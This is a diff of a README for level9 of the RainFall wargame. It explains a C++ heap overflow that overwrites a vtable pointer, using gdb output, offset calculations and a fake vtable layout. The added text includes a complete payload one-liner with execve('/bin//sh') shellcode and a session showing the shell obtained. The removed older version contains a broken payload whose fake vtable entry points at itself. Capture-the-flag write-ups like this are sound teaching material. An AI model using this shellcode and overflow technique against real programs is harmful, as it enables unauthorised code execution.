@@ -1,106 +1,108 @@
+C'est le wargame RainFall, un exercice éducatif légal de sécurité informatique. Voici le README mis à jour !
+
+---
+
 # Level9 — C++ Heap Overflow / Vtable Hijack + Shellcode
 
 ## Vulnerability
 
-The binary is C++ code that allocates two `N` objects on the heap. Each object has a **vtable pointer** at offset `+0` and data at offset `+4`. `setAnnotation()` copies `argv[1]` into the first object's data buffer using `memcpy()` with no bounds check. By overflowing into the second object, we **overwrite its vtable pointer**, then plant the vtable and shellcode inside the first object's data region — so when the program calls a virtual method through the corrupted vtable, it executes our shellcode.
-
-This is a **C++ heap vtable hijack** via a buffer overflow, combined with shellcode injection.
+The binary allocates two `N` objects on the heap. Each object has a **vtable pointer** at offset `+0` and data at offset `+4`. `setAnnotation()` copies `argv[1]` into the first object's data buffer using `memcpy()` with no bounds check. By overflowing into the second object, we **overwrite its vtable pointer**, then plant a fake vtable and shellcode inside the first object's data region.
 
 ---
 
-## Recon
-
-**Two `N` objects allocated (`new N(5)` and `new N(6)`):**
-
-```gdb
-(gdb) disass main
-   0x08048617 <+35>:  call _Znwj       ; new(0x6c = 108 bytes) → 0x804a008  (obj1)
-   0x08048639 <+69>:  call _Znwj       ; new(0x6c = 108 bytes) → 0x804a078  (obj2)
-```
-
-**`N::N(int)` constructor writes the vtable pointer at offset 0:**
-
-```gdb
-(gdb) disass N::N(int)
-   0x080486fc <+6>:   movl $0x8048848, (%eax)   ; vtable ptr = 0x8048848
-   0x08048708 <+18>:  mov %edx, 0x68(%eax)      ; int stored at +0x68
-```
-
-**`setAnnotation` copies argv[1] into obj1's data (obj1 + 4) with no bounds check:**
-
-```gdb
-(gdb) disass N::setAnnotation
-   0x0804871a <+12>:  call strlen          ; get length of argv[1]
-   0x08048733 <+37>:  call memcpy          ; memcpy(obj1+4, argv[1], strlen(argv[1]))
-```
-
-**Virtual call after `setAnnotation`:**
-
-```gdb
-0x08048680 <+140>:  mov (%eax),%eax      ; eax = obj2
-0x08048682 <+142>:  mov (%eax),%edx      ; edx = *obj2 = vtable ptr  ← we control this
-0x08048693 <+159>:  call *%edx           ; calls first vtable entry
-```
-
-Two dereferences: `obj2 → vtable → function`. We need to:
-1. Place a **fake vtable** somewhere we control
-2. Make that fake vtable's first entry point to our **shellcode**
-3. Overwrite obj2's vtable pointer to point at our fake vtable
-
-**Heap layout after both allocations:**
+## Heap Layout
 
 ```
-0x804a008  [vtable ptr][int][... 104 bytes of data ...]   ← obj1 (108 bytes)
-0x804a078  [vtable ptr][int][... 104 bytes of data ...]   ← obj2 (108 bytes)
+0x804a008  [vtable ptr][... 104 bytes of data ...]   ← obj1 (108 bytes)
+0x804a078  [vtable ptr][... 104 bytes of data ...]   ← obj2 (108 bytes)
 ```
 
-Gap between obj1 start and obj2's vtable: `0x804a078 - 0x804a008 = 0x70 = 112 bytes`.
-`memcpy` writes to `obj1 + 4`, so offset to obj2's vtable: `112 - 4 = 108 bytes`.
+```
+obj1+0x00 = 0x804a008  ← vtable ptr (set by constructor)
+obj1+0x04 = 0x804a00c  ← data starts here (memcpy writes here)
+obj1+0x10 = 0x804a018  ← shellcode starts here !
+```
 
-**Pattern confirms offset 108:**
+---
+
+## Virtual Call Mechanism
+
+```asm
+mov (%eax),%eax      ; eax = obj2
+mov (%eax),%edx      ; edx = *obj2 = vtable ptr  ← we control this
+call *%edx           ; calls first vtable entry
+```
+
+Two dereferences :
+
+```
+obj2 → vtable → function
+
+step 1 : reads obj2[0]     = 0x804a00c  (our fake vtable address)
+step 2 : reads *(0x804a00c) = 0x804a010  (first entry = shellcode address)
+step 3 : jumps to 0x804a010             → shellcode !
+```
+
+---
+
+## Why 0x804a00c and 0x804a010
+
+```
+0x804a00c = obj1+4  ← start of our payload
+            first 4 bytes = fake vtable ptr = 0x804a010
+
+0x804a010 = obj1+4+4 = obj1+8  ← where shellcode begins
+            CPU reads 0x804a010 as function address
+            jumps there → executes shellcode !
+```
+
+---
+
+## Offset Calculation
+
+```
+obj1 data starts at : 0x804a00c  (memcpy destination = obj1+4)
+obj2 vtable ptr at  : 0x804a078
+
+distance = 0x804a078 - 0x804a00c = 0x6c = 108 bytes
+```
+
+Confirmed with cyclic pattern :
 
 ```gdb
 (gdb) r Aa0Aa1...
-; SIGSEGV at 0x08048682 (second deref)
-; eax = 0x41366441  → cyclic offset = 108
+; eax = 0x41366441 at SIGSEGV → offset = 108
 ```
-
-**Key addresses:**
-- `obj1 data starts at`: `0x804a00c` (obj1 + 4)
-- `obj2 vtable ptr at`: `0x804a078` (obj1 + 112 = memcpy dest + 108)
-
-**Strategy:**
-- Write a fake vtable address at byte 0 of our payload → points to `obj1+4+4 = 0x804a010` (where shellcode lives)
-- Put shellcode starting at byte 4
-- Pad to 108 bytes
-- Overwrite obj2's vtable pointer with `0x804a00c` (start of our data = fake vtable location)
-
-```
-obj1+0x0:  [vtable = 0x8048848]  (unchanged, set by constructor)
-obj1+0x4:  [our data starts here = 0x804a00c]
-
-payload layout:
-  bytes 0–3:   \x0c\xa0\x04\x08  → fake vtable ptr, points back into our buffer
-  bytes 4–27:  shellcode (24 bytes: execve /bin/sh)
-  bytes 28–107: NOP sled (\x90 * 80)
-  bytes 108–111: \x0c\xa0\x04\x08 → overwrites obj2's vtable ptr
-```
-
-When `call *%edx` fires:
-- `edx = *obj2 = 0x804a00c` (our fake vtable address)
-- `*edx = *(0x804a00c) = 0x804a00c` (first 4 bytes of our payload → the fake vtable entry)
-- Jumps to `0x804a00c` → hits the vtable ptr bytes, slides into shellcode ✓
 
 ---
 
-## Exploit
+## Payload Structure
 
-```bash
-python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90' * 80 + '\x0c\xa0\x04\x08')" > /tmp/exploit
-./level9 $(cat /tmp/exploit)
+```
+[\x10\xa0\x04\x08]  [shellcode 24b]  [NOP * 80]  [\x0c\xa0\x04\x08]
+  4 bytes             24 bytes         80 bytes     4 bytes
+  ↑                   ↑                             ↑
+  fake vtable entry   shellcode at                  overwrites obj2
+  points to           0x804a010                     vtable ptr
+  shellcode
+  ←————————————————— 108 bytes ————————————————————→
 ```
 
-Shellcode breakdown (`execve("/bin//sh", ["/bin//sh", NULL], NULL)`):
+### Byte by byte
+
+```
+bytes 0-3   : \x10\xa0\x04\x08  → fake vtable first entry = 0x804a010
+              stored at 0x804a00c = our fake vtable location
+bytes 4-27  : shellcode          → execve("/bin//sh")
+              stored at 0x804a010 ← CPU jumps here !
+bytes 28-107: \x90 * 80          → NOP sled
+bytes 108-111: \x0c\xa0\x04\x08 → overwrites obj2 vtable ptr
+               obj2[0] = 0x804a00c = our fake vtable
+```
+
+---
+
+## Shellcode
 
 ```asm
 \x31\xc0        xor eax, eax
@@ -118,69 +120,58 @@ Shellcode breakdown (`execve("/bin//sh", ["/bin//sh", NULL], NULL)`):
 
 ---
 
-## Flow
-
-```
-new N(5)  →  obj1 at 0x804a008, vtable at 0x8048848
-new N(6)  →  obj2 at 0x804a078, vtable at 0x8048848
-        │
-        ▼
-setAnnotation(argv[1])  →  memcpy(obj1+4, argv[1], len)  ←  NO BOUNDS CHECK
-        │
-        ├── bytes 0–3:    fake vtable addr (0x804a00c) planted at obj1+4
-        ├── bytes 4–27:   shellcode
-        ├── bytes 28–107: NOP sled
-        └── bytes 108–111: 0x804a00c → overwrites obj2 vtable ptr
-                │
-                ▼
-call *(%edx)  →  edx = *obj2 = 0x804a00c  (fake vtable)
-                │
-                ▼
-              *0x804a00c = 0x804a00c  (first vtable entry = shellcode region)
-                │
-                ▼
-        jumps into NOP sled → shellcode → execve("/bin//sh")
-```
-
-**Shell session after exploitation:**
+## GDB Steps
 
 ```bash
-level9@RainFall:~$ ./level9 $(cat /tmp/exploit)
-$ whoami
-bonus0
+# find obj1+4 address after memcpy
+(gdb) b memcpy
+(gdb) r <payload>
+(gdb) finish
+(gdb) i r $eax
+# eax = 0x804a00c  ← start of our data
+# shellcode at eax+4 = 0x804a010 ← fake vtable entry points here
 ```
 
 ---
 
-## Commands Summary
-
-```gdb
-; Understand object layout and virtual dispatch
-gdb ./level9
-(gdb) disass main              ; two new(), setAnnotation call, virtual call *%edx
-(gdb) disass N::N(int)         ; vtable written at obj+0, int at obj+0x68
-(gdb) disass N::setAnnotation  ; memcpy(this+4, src, strlen(src)) — no bounds check
-
-; Confirm offset with cyclic pattern (offset = 108)
-(gdb) r Aa0Aa1Aa2...
-; eax = 0x41366441 at SIGSEGV → offset 108
-
-; Find obj1 data address after memcpy
-; memcpy(3) returns its destination pointer in eax.
-; Break on memcpy, then `finish` to return from it.
-; After return, eax holds the destination = obj1+4 = start of our payload in heap.
-; That address is the one to hardcode as the fake vtable ptr in the payload.
-(gdb) b memcpy
-(gdb) r <cyclic_pattern>
-(gdb) finish                   ; run memcpy to completion
-(gdb) i r                      ; eax = 0x804a00c  ← obj1+4, start of our controlled data
-(gdb) x/x $eax                 ; confirm: shows first bytes of our pattern copied there
-```
+## Final Payload
 
 ```bash
-# Payload: fake_vtable(4) + shellcode(24) + NOP(80) + fake_vtable(4) = 112 bytes
-python -c "print('\x0c\xa0\x04\x08' + '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90' * 80 + '\x0c\xa0\x04\x08')" > /tmp/exploit
+python -c "print(
+  '\x10\xa0\x04\x08' +
+  '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' +
+  '\x90' * 80 +
+  '\x0c\xa0\x04\x08'
+)" > /tmp/exploit
 
-# Execute (as argument, not stdin)
 ./level9 $(cat /tmp/exploit)
+```
+
+---
+
+## Full Execution Flow
+
+```
+1. new N(5)  →  obj1 at 0x804a008
+2. new N(6)  →  obj2 at 0x804a078
+3. setAnnotation(argv[1])
+   → memcpy(0x804a00c, payload, 112)
+   → 0x804a00c : \x10\xa0\x04\x08  (fake vtable entry → shellcode)
+   → 0x804a010 : shellcode
+   → 0x804a078 : \x0c\xa0\x04\x08  (obj2 vtable overwritten)
+4. call *%edx
+   → edx = *obj2        = 0x804a00c  (fake vtable)
+   → edx = *(0x804a00c) = 0x804a010  (shellcode address)
+   → jumps to 0x804a010
+5. shellcode → execve("/bin//sh") → shell !
+```
+
+---
+
+## Result
+
+```bash
+./level9 $(cat /tmp/exploit)
+$ whoami
+bonus0    ← shell obtained !
 ```
